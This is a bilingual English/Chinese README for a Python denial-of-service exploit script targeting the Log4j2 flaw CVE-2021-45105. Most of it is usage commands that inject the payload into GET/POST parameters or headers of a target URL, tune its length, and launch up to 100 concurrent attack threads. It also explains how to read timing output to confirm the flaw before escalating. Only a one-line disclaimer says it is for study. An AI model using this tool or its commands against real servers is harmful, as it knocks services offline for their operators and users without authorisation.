# 说明 about

 author: 我超怕的

 blog: https://www.cnblogs.com/iAmSoScArEd/

 github: https://github.com/iAmSOScArEd/

 date: 2021-12-20 

log4j2 dos exploit 

log4j2 dos 漏洞利用脚本

CVE-2021-45105 Exploit

CVE-2021-45105 利用脚本

# 利用方式 how to use

## English：

```bash
Log4j2_dos.py -u <url> -m <method> -d <params> -H <header> -l <loop> -t <thread>

-u,--url    	  attack target
-m,--method    http method, only get and post. default is get.
-d,--data   	  get or post params, json format like:{\"username\":\"\"}
-H,--header    request header, json format like:{\"user-agent\":\"\"}
-l,--loop    	 payload loop times (or length),default 100.it is determine where is the params, example get param max length or post param max length or request header max length
-t,--thread    attack thread. default is 0, just request once.

usage:
Log4j2_dos.py -u http://url.com/ -d {\"username\":\"\"}
Log4j2_dos.py -u http://url.com/ -d {\"username\":\"\"} -l 500 -t 100
Log4j2_dos.py -u http://url.com/ -m post -d {\"username\":\"\"} -l 500
Log4j2_dos.py -u http://url.com/ -m post -H {\"user-agent\":\"\"} -l 500 -t 100
Log4j2_dos.py -u http://url.com/ -m post -d {\"username\":\"\"} -H {\"user-agent\":\"\"} -l 500
```
-l (--loop) the value needs to be set separately depending on the scene, not the larger the better. If it exceeds the length that the web server can accept, it may cause the attack detection to fail and no attack effect.

Output format：

[+] normal time:0.11111

[+] attack time:2.00000

if attack time -normal time>1 or something，it maybe exist vulnerability，can use -t param set attack thread.

## 中文：

```bash
 Log4j2_dos.py -u <url> -m <method> -d <params> -H <header> -l <loop> -t <thread>
 
-u,--url   		 攻击目标
-m,--method    默认为get，http方式，仅支持get和post
-d,--data   	 get或post请求参数，json格式，如：{\"username\":\"\"}
-H,--header    请求头, json格式， 如：{\"user-agent\":\"\"}
-l,--loop    	 默认为100，payload循环长度,根据参数在不同的位置，设置不同的数值，如请求头最大允许长度、get最大长度、post最大长度
-t,--thread    默认为0,表示仅请求一次。攻击线程。

常见用法:
# 默认get，100个payload循环，攻击探测一次，在username参数中添加攻击payload
Log4j2_dos.py -u http://url.com/ -d {\"username\":\"\"}
# 默认get，设置500个payload循环，发起100个攻击线程，在username参数中添加攻击payload
Log4j2_dos.py -u http://url.com/ -d {\"username\":\"\"} -l 500 -t 100
# 指定POST，设置500个payload循环，攻击探测一次，在username参数中添加攻击payload
Log4j2_dos.py -u http://url.com/ -m post -d {\"username\":\"\"} -l 500
# 指定POST，设置500个payload循环，发起100个攻击线程，在user-agent请求头中添加攻击payload
Log4j2_dos.py -u http://url.com/ -m post -H {\"user-agent\":\"\"} -l 500 -t 100
# 指定POST，设置500个payload循环，攻击探测一次，在username参数和user-agent请求头中添加攻击payload
Log4j2_dos.py -u http://url.com/ -m post -d {\"username\":\"\"} -H {\"user-agent\":\"\"} -l 500
```

-l（--loop） 数值需要看场景分别设置，并不是越大越好，如果超出web服务器所能接受的长度，可能会导致攻击探测失败，没有攻击效果。

输出格式：

[+] normal time:0.11111

[+] attack time:2.00000

如果attack time延迟很大，说明漏洞存在，可以利用-t参数设置攻击线程

# 免责声明

请勿用于非法用途，仅供学习参考。
任何违法行为与本人无关。

(蹩脚英语，没用翻译，将就看。)

By：我超怕的
